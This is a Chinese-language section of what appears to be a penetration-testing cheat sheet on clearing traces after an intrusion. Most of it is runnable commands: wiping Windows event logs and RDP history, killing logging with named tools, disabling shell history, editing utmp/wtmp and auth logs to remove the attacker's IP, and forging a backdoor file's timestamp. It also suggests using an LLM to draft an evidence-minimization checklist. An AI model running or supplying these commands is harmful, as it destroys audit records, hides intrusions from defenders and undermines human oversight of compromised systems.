## 十、痕迹清除

### 10.1 Windows日志
```
wevtutil el > list.txt                                    # 日志类别列表
wevtutil cl "windows powershell"                          # 清除指定类别
wevtutil cl "security" ; wevtutil cl "system" ; wevtutil cl "application"
# 精确删除(仅删自己相关事件,更隐蔽): Eventlogedit-evtx--Evolution / EventCleaner
# 破坏日志记录功能(非删除,规避取证): Invoke-Phant0m(杀EventLog线程)
# 3389登录记录清除
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
# 文件访问时间伪造
# PowerShell执行历史/AMSI: 清理PSReadLine历史
```

### 10.2 Linux痕迹
```bash
unset HISTFILE; export HISTFILE=/dev/null                 # 关闭历史
history -c
# 登录记录清除(utmp/wtmp/lastlog)
utmpdump /var/run/utmp | grep -v <攻击IP> | utmpdump -r > /tmp/utmp && mv /tmp/utmp /var/run/utmp
utmpdump /var/log/wtmp | grep -v <攻击IP> | utmpdump -r > /tmp/wtmp && touch -r /var/log/wtmp /tmp/wtmp && mv /tmp/wtmp /var/log/wtmp
# 日志文件选择性删除: grep -v 自己的IP 后覆盖写回
sed -i '/<攻击IP>/d' /var/log/auth.log /var/log/secure 2>/dev/null
# webshell/后门文件时间戳伪造
touch -r /etc/passwd /tmp/backdoor.sh
```

### 10.3 清除原则（攻防对抗）
```
- 主控/日志服务器日志无法本地清除 → 先确认日志是否实时外传
- 横向痕迹: 目标主机上执行的命令/服务创建记录
- 内存痕迹: 进程注入后退出即消失,优先内存型后门
- AI辅助: 让LLM根据操作记录生成"证据链最小化"清理清单(哪些日志类别、哪些事件ID)
- 合规红线: 渗透测试中痕迹清除须经客户授权,报告应保留操作记录
```

